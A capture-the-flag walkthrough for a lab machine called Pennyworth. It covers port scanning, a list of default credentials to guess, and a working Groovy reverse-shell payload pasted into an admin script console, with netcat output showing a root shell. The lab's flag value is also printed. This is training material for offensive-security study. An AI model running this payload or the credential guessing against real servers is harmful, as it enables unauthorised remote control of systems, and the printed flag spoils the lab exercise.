![Pennyworth.png](/assets/Tier-1/Pennyworth/Pennyworth.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 1 10.129.97.64
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.97.64
```

**Output**
```bash
PORT     STATE SERVICE
8080/tcp open  http-proxy
```


3. Visit web page

![web.PNG](/assets/Tier-1/Pennyworth/web.PNG)

4. Try to login with default credentials

| Username | Password |
|:--------:|:--------:|
| `admin`  | `admin`  |
| `root`   | `root`   |
| `admin`  | `password` |
| `root`   | `password` |
| `admin1` | `admin1`   |
| `admin`  | `password1` |
| `root`   | `password1` |

**Output**

![login.PNG](/assets/Tier-1/Pennyworth/login.PNG)

5. Go to `http://10.129.137.245:8080/script`

![script.PNG](/assets/Tier-1/Pennyworth/script.PNG)

* This console admit **Groovy scripts**
* Go to **https://www.revshells.com/** and find rev shell with Groovy.

6. Paste the code of reverse shell and modify to obtain a `bash`


```groovy
String host="<tun0 IP>";
int port=<port>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    }catch (Exception e){}};
    p.destroy();s.close();
```


7. Listen on port you choose with **nc**
8. Click on **Run** in Script Console Window

9. You obtain a shell how root
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─| nc -lvnp 4545                                            
listening on [any] 4545 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.137.245] 45768
whoami
root
```

10. Cat flag
```bash
cat /root/flag.txt
9cdfb439c7876e703e307864c9167a15
```








